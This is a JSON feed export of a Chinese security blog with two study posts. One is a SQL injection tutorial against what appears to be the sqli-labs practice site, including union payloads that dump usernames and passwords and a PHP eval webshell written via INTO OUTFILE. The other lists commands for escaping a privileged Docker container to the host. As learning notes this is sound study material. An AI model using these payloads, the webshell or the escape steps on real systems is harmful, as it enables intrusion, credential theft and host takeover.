{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg • All posts by \"网络安全\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/10/28/sql%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2023/10/28/sql%E6%B3%A8%E5%85%A5/",
            "title": "sql注入",
            "date_published": "2023-10-28T11:09:44.000Z",
            "content_html": "<p>对 mysql 不了解的不会语句的去看数据库篇</p>\n<p>mysql15 以后默认存放一个 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、schemata 表字段 CHEMA_NAME 记录着库的信息</p>\n<p><img data-src=\"https://s2.loli.net/2023/10/28/wUSYyBN4CiOpZlh.png\" alt=\"1.png\"></p>\n<p>tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名</p>\n<p><img data-src=\"https://s2.loli.net/2023/10/28/1XmDbgNOnuJGtwL.png\" alt=\"2.png\"></p>\n<p>columns 存储该用户创建的所有数据库的库名、标名和字段名</p>\n<p><img data-src=\"https://s2.loli.net/2023/10/28/WtMqdxSIiyleUGv.png\" alt=\"3.png\"></p>\n<p>查询 admin 库中所有表字段</p>\n<p><img data-src=\"https://s2.loli.net/2023/10/28/rzhQMwtTfciLEHu.png\" alt=\"4.png\"></p>\n<p>查询某个库某个表的字段可以这样查询</p>\n<p>select * from information_schema.COLUMNS where TABLE_SCHEMA=‘admin’ and</p>\n<p>TABLE_NAME=‘admin’</p>\n<p><img data-src=\"https://s2.loli.net/2023/10/28/HWvf2T5RmhGOSQb.png\" alt=\"5.png\"></p>\n<p><strong>2.sql 注入原理</strong></p>\n<p>SQL 注入漏洞的产生需要满足以下两个条件  参数用户可控：从前端传给后端的参数内容是用户可以控制的  参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。</p>\n<p>当用户传入参数为 1’的时候，在数据库执行如下所示。</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' 此 SQL 语句不符合语法规则就会报错。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>You have an error in your SQL syntax; check the manual that corresponds</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>to your MySQL server version for the right syntax to use near '''</span> at line <span class=\"token number\">1</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>当用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 时 <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 也是真 <span class=\"token operator\">and</span> 两边均为真 所以页面会返回 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 的结果。 如果用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 时</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 为假 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真 <span class=\"token operator\">and</span> 两边有一个为假，所以页面返回与 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 不一样的结果。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>由此可以初步判断存在 <span class=\"token keyword\">SQL</span> 注入漏洞，攻击者可以进一步拼接  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span> <span class=\"token operator\">or</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr></table></figure><p>判断页面是否不一样，还有无回显的情况输入语句页面没有变化但实际上执行了这种还有延时注入给拼接语句时 sleep 5 看页面是不是 5 秒后显示的</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">sql</span>注释符</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># 单行注释 url 编码 %23</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*  */</span> 多行注释 <span class=\"token comment\">/**/</span>当空格用</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">--\"空格\" 单行注释</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--+ 也可以</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>是否存在注入判断注入的类型是什么</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>判断字段数 <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>确定回显点 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>查询数据库信息 @<span class=\"token variable\">@version</span> @<span class=\"token variable\">@datadir</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>查询用户名，数据库名 <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>文件读取 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'C:\\\\wondows\\\\win.ini'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>写入 webshell <span class=\"token keyword\">select</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>补充一点，使用 <span class=\"token keyword\">sql</span> 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</pre></td></tr></table></figure><p><strong>5. 注入类型</strong></p>\n<p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p>\n<p>UNION query SQL injection（可联合查询注入）</p>\n<p>Stacked queries SQL injection（可多语句查询注入）</p>\n<p>堆叠查询 Boolean-based blind SQL injection（布尔型注入）</p>\n<p>Error-based SQL injection（报错型注入）</p>\n<p>Time-based blind SQL injection（基于时间延迟注入）</p>\n<p><strong>6. 接受请求类型区分</strong></p>\n<p>GET 注入</p>\n<p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</p>\n<p>POST 注入 POST 请求参数是放在请求 body 里的，长度没有限制</p>\n<p>COOKIE 注入 cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p>\n<p><strong>注入数据类型的区分</strong></p>\n<p>int 整型 select * from users where id=1 sting</p>\n<p>字符型 select * from users where username=‘admin’ like</p>\n<p>搜索型 select * from news where title like ‘% 标题 %’</p>\n<p><strong>union select 联合注入</strong></p>\n<p>1, 判断 [<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=1 %23</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=2 %23</p>\n<p>报错存在注入</p>\n<p><img data-src=\"https://s2.loli.net/2023/10/28/KWlRcTImidMs2ye.png\" alt=\"6.png\"></p>\n<p>2, 查字段</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23  --返回正常</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回正常</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23  --返回正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回错误</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>三个字段</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2023/10/28/yNMA5uUofaZiO48.png\" alt=\"7.png\"></p>\n<p><strong>利用 union 联合查询收集信息</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,3 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#看哪个字段可以显示信息，利用它获取数据库信息</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>获取数据库信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat_ws<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@datadir</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version_compile_os</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>databaes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库用户名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库版本</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>@<span class=\"token variable\">@datadir</span> <span class=\"token comment\">#获取数据库路径</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>@<span class=\"token variable\">@version_conpile_os</span> <span class=\"token comment\">#获取操作系统版本</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Your Login name:</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>security <span class=\"token comment\">#数据库名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>（<span class=\"token number\">5.7</span><span class=\"token number\">.26</span>） <span class=\"token comment\">#数据库版本</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>（root<span class=\"token variable\">@localhost</span>） <span class=\"token comment\">#数据库用户名</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>（D:\\Everyday<span class=\"token operator\">-</span>tools\\phpstudy_pro\\Extensions\\MySQL5<span class=\"token punctuation\">.</span><span class=\"token number\">7.26</span>\\<span class=\"token keyword\">data</span>\\root<span class=\"token variable\">@localhost</span>）<span class=\"token comment\">#数据库路径</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Win64 <span class=\"token comment\">#操作系统版本</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Your Password:<span class=\"token number\">3</span></pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2023/10/28/Dx4ZucTAMV63IFP.png\" alt=\"8.png\"></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security<span class=\"token string\">' limit 0,1 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#查询单个 改变limit 0,1 前面的数即可查询其他表例如 limit 1,1 limit 2,1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>另一种查询全部</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>group_concat <span class=\"token comment\">#分组查询结果，隔开</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>emails<span class=\"token punctuation\">,</span>referers<span class=\"token punctuation\">,</span>uagents<span class=\"token punctuation\">,</span>users</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2023/10/28/kP2dbz5oLD3RpOQ.png\" alt=\"9.png\"></p>\n<p><strong>4, 查列名</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,group_concat(column_name ) from information_schema.columns where table_schema=database() and table_name = \"users\" %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Your Login name:2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Your Password:id,username,password #列名</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password <span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#查询 users 表里的 username 和 password</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Your Login name:<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Your Password:DumbDumb<span class=\"token punctuation\">,</span>AngelinaI<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">,</span>Dummyp<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">,</span>securecrappy<span class=\"token punctuation\">,</span>stupidstupidity<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>supermangenious<span class=\"token punctuation\">,</span>batmanmob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">,</span>adminadmin<span class=\"token punctuation\">,</span>admin1admin1<span class=\"token punctuation\">,</span>admin2admin2<span class=\"token punctuation\">,</span>admin3admin3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dhakkandumbo<span class=\"token punctuation\">,</span>admin4admin4</pre></td></tr></table></figure><p><img data-src=\"https://s2.loli.net/2023/10/28/g9TG5WYf8wMpyCt.png\" alt=\"10.png\"></p>\n<p><strong>写 webshell</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>三个条件：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1.</span>具有root权限。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2.</span>在数据库配置文件中的 配置项含有：secure_file_priv<span class=\"token operator\">=</span><span class=\"token string\">''</span>。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>（注意在数据库中此项默认为secure_file_priv<span class=\"token operator\">=</span><span class=\"token boolean\">null</span>）。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>secure_file_prive<span class=\"token operator\">=</span><span class=\"token boolean\">null</span> <span class=\"token comment\">// 限制 mysqld 不允许导入导出</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span><span class=\"token operator\">/</span>path<span class=\"token operator\">/</span>  <span class=\"token comment\">// 限制 mysqld 的导入导出只能发生在默认的 /path/ 目录下</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span>’’  <span class=\"token comment\">// 不对 mysqld 的导入 导出做限制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">3.</span>知道数据库的绝对路径。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">outfile</span>函数可以导出多行，而<span class=\"token keyword\">dumpfile</span>只能导出一行数据</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">outfile</span>函数在将数据写到文件里时有特殊的格式转换，而<span class=\"token keyword\">dumpfile</span>则保持原数据格式</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,\"&lt;?php @eval($_POST['</span>cmd'<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">></span><span class=\"token string\">\",3 into outfile \"</span>D:\\\\Everyday<span class=\"token operator\">-</span>tools\\\\phpstudy_pro\\\\WWW\\\\www<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>cn\\\\shell8<span class=\"token punctuation\">.</span>php\" <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://example.com/2023/10/27/docker%E9%80%83%E9%80%B8/",
            "url": "http://example.com/2023/10/27/docker%E9%80%83%E9%80%B8/",
            "title": "docker逃逸",
            "date_published": "2023-10-27T06:33:01.000Z",
            "content_html": "<p><em>特权模式</em>逃逸</p>\n<p>当容器启动加上–privileged 选项时，容器可以访问宿主机上所有设备</p>\n<p>启动一个特权容器<br>\n <code>sudo docker run --rm --privileged -it ubuntu:18.04 bash</code></p>\n<p>判断容器是否特权启动<br>\n <code>查看磁盘，默认情况下容器执行fdisk -l 是无法查看的</code> <br>\n <code>fdisk -l</code></p>\n<p>查看 capEff 值，特权值为 0000003fffffffff<br>\n <code>cat /proc/self/status | grep CapEff</code></p>\n<p>#创建一个挂载目录<br>\n <code>mkdir /tmp/hosts</code></p>\n<p>#查看宿主机磁盘文件<br>\n <code>fdisk -l</code></p>\n<p>#挂载到创建的目录<br>\n <code>mount /dev/sda1 /tem/hosts/</code> <br>\n <code>cd /tmp/hosts/</code></p>\n<p>#通过 chroot 切换 bash<br>\n <code>chroot ./ bash</code></p>\n",
            "tags": []
        }
    ]
}